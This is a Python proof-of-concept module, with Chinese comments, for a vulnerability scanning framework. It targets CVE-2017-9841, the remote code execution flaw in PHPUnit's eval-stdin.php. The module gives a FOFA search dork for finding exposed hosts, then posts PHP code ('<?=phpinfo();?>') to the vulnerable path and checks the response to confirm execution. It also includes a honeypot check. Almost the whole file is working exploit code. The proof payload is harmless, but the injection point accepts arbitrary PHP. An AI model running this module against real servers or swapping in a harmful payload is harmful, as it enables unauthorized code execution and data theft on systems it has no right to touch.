# coding:utf-8  
import requests
from lib.core.common import url_handle,get_random_ua
from lib.core.poc import POCBase
# ...
import urllib3
urllib3.disable_warnings()

class POC(POCBase):

    _info = {
        "author" : "jijue",                      # POC作者
        "version" : "1",                    # POC版本，默认是1  
        "CreateDate" : "2021-06-09",        # POC创建时间
        "UpdateDate" : "2021-06-09",        # POC创建时间
        "PocDesc" : """
            存在该漏洞的资产在全网中非常稀有，笔者测试时也仅扫到一台而已，
            因此出于保护珍奇资产的目的，下面的example不做记录
        """,                                # POC描述，写更新描述，没有就不写

        "name" : "PHPUnit eval-stdin.php 远程命令执行漏洞",                        # 漏洞名称
        "VulnID" : "CVE-2017-9841",                      # 漏洞编号，以CVE为主，若无CVE，使用CNVD，若无CNVD，留空即可
        "AppName" : "PHPUnit",                     # 漏洞应用名称
        "AppVersion" : "PHPUnit < 5.6.3",                  # 漏洞应用版本
        "VulnDate" : "2021-06-09",                    # 漏洞公开的时间,不知道就写今天，格式：xxxx-xx-xx
        "VulnDesc" : """
            PHPUnit5.6.3之前的版本，存在一处远程代码执行漏洞，利用漏洞可以获取服务器敏感信息及权限。
        """,                                # 漏洞简要描述

        "fofa-dork":"""
            "PHPUnit"
        """,                     # fofa搜索语句
        "example" : "",                     # 存在漏洞的演示url，写一个就可以了
        "exp_img" : "",                      # 先不管  
    }

    def _verify(self):
        """
        返回vuln

        存在漏洞：vuln = [True,html_source] # html_source就是页面源码  

        不存在漏洞：vuln = [False,""]
        """
        vuln = [False,""]
        url = self.target + "/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php" # url自己按需调整
        data = "<?=phpinfo();?>"

        headers = {"User-Agent":get_random_ua(),
                    "Connection":"close",
                    "Content-Type": "application/x-www-form-urlencoded(raw)",
                    "Accept-Encoding":"gzip",
                    }
        
        try:
            """
            检测逻辑，漏洞存在则修改vuln值为True，漏洞不存在则不动
            """
            req = requests.post(url,data = data,headers = headers , proxies = self.proxy ,timeout = self.timeout,verify = False)
            if "PHP Credits" in req.text and "PHP License" in req.text :#req.status_code == 200 and :
                vuln = [True,req.text]
            else:
                vuln = [False,req.text]
        except Exception as e:
            raise e
        
        # 以下逻辑酌情使用
        if self._honeypot_check(vuln[1]) == True:
            vuln[0] = False
        
        return vuln

    def _attack(self):
        return self._verify()